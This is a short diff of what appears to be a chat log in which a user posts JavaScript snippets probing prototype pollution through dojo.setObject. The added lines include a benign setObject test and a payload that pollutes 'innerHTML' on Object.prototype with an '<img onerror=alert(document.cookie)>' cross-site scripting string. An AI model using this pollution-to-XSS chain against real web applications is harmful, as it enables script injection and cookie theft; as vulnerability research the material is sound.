@@ -11,3 +11,12 @@ console.log({}.bar);
 Cryptotears, [26.06.2025 12:28]
 dojo.setObject("proto.vuln", "polluted!", {});
 console.log(Object.prototype);
+
+
+Cryptotears, [26.06.2025 12:31]
+const testObj = {};
+dojo.setObject("test.path", "works", testObj);
+console.log(testObj.test.path);
+
+Cryptotears, [26.06.2025 12:32]
+dojo.setObject("proto.innerHTML", '<img src=x onerror=alert(document.cookie)>', {});
